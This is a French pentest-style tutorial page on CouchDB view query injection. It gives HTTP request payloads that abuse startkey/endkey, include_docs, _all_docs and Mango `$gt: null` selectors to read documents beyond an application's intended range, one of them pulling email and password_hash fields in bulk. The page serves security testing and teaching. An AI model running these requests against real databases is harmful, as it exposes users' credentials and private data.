---
title: "Injection de requête de vue dans CouchDB"
description: "Manipuler les paramètres key, startkey, endkey, include_docs et _all_docs sur les requêtes de vue CouchDB permet de lire des documents hors de la plage de clés prévue."
keywords:
  - injection de requête de vue CouchDB
  - startkey endkey
  - include_docs
  - _all_docs
  - plage de clés
  - sélecteur _find
---

# Injection de requête de vue

Toutes les attaques CouchDB ne nécessitent pas une fonction plantée. L'API de vue et de listage de documents est pilotée par les paramètres de chaîne de requête, et lorsqu'une application transmet des valeurs influencées par l'attaquant dans `key`, `startkey`, `endkey`, `include_docs`, ou les endpoints `_all_docs` et `_find`, l'appelant peut élargir une recherche pour lire des documents hors de la plage que l'application avait prévue.

## Paramètres de plage

Une requête de vue est restreinte par des paramètres de clé. Une application qui entend récupérer une seule clé peut construire :

```http
GET /app/_design/d/_view/by_user?key="user:42" HTTP/1.1
```

Si l'appelant contrôle la clé, ou les `startkey`/`endkey` environnants, échanger un `key` exact pour une plage ouverte renvoie chaque ligne que la vue contient :

```http
GET /app/_design/d/_view/by_user?startkey="user:"&endkey="user:￰" HTTP/1.1
```

`￰` est un point de code élevé utilisé comme borne supérieure pour que la plage couvre toutes les clés avec le préfixe. Abandonner les deux bornes renvoie la vue entière, et `descending=true` avec des bornes inversées est un moyen courant de déjouer des vérifications de bornes naïves :

```http
GET /app/_design/d/_view/by_user?descending=true HTTP/1.1
```

## include_docs

Par défaut, une vue renvoie la clé et la valeur émises. Ajouter `include_docs=true` fait attacher par CouchDB le document source complet à chaque ligne, ce qui peut faire remonter des champs que la valeur de la vue omettait délibérément :

```http
GET /app/_design/d/_view/by_user?startkey="user:"&endkey="user:￰"&include_docs=true HTTP/1.1
```

Lorsqu'une application comptait sur une vue n'émettant que des champs sûrs, `include_docs=true` réintroduit tout ce que contient le document, y compris les hachages de mots de passe, les jetons et les métadonnées `_attachments`.

## _all_docs

`_all_docs` est un index intégré de chaque `_id` de document de la base et prend les mêmes paramètres de plage :

```http
GET /app/_all_docs?include_docs=true HTTP/1.1
```

```http
POST /app/_all_docs HTTP/1.1
Content-Type: application/json

{ "keys": ["user:42", "user:43", "config:smtp", "_design/pub"] }
```

Avec `include_docs=true`, cela diffuse chaque corps de document de la base, contournant toute vue que l'application exposait comme son unique chemin de lecture prévu. Un tableau `keys` permet à l'appelant de nommer des identifiants arbitraires, y compris des documents de conception, pour les tirer directement.

## Sélecteurs _find

L'endpoint Mango `_find` prend un sélecteur JSON dans le corps de la requête. Lorsqu'une application fusionne une entrée utilisateur dans l'objet sélecteur, l'attaquant injecte des opérateurs qui élargissent la correspondance, la même idée d'injection d'opérateur vue dans d'autres magasins documentaires :

```http
POST /app/_find HTTP/1.1
Content-Type: application/json

{ "selector": { "role": { "$gt": null } }, "limit": 9999 }
```

`{ "$gt": null }` correspond à chaque document qui possède le champ, et `{ "_id": { "$gt": null } }` correspond à tous les documents. Augmenter `limit` et ajouter `"fields"` permet à l'appelant de tirer de grands ensembles de résultats en une seule requête :

```http
POST /app/_find HTTP/1.1
Content-Type: application/json

{ "selector": { "_id": { "$gt": null } }, "fields": ["_id","email","password_hash"], "limit": 100000 }
```

## Sondage

Comparez une requête restreinte à une requête aux bornes élargies : si `startkey`/`endkey` ou un sélecteur `$gt: null` renvoie plus de lignes que la vue normale de l'application, le paramètre est atteignable par l'attaquant. Un `key` qui accepte un tableau ou un objet JSON là où une chaîne était attendue, sans erreur, signale que la valeur atterrit dans la requête sans échappement.

## Outils

- **curl** : émettre des requêtes de vue, _all_docs et _find avec des paramètres élargis.
- **Burp Repeater** : altérer les valeurs startkey, endkey, include_docs et de sélecteur.

## Références

- [Apache CouchDB: View query parameters](https://docs.couchdb.org/en/stable/api/ddoc/views.html)
- [Apache CouchDB: _all_docs](https://docs.couchdb.org/en/stable/api/database/bulk-api.html)
- [Apache CouchDB: _find and Mango selectors](https://docs.couchdb.org/en/stable/api/database/find.html)
- [PayloadsAllTheThings: NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
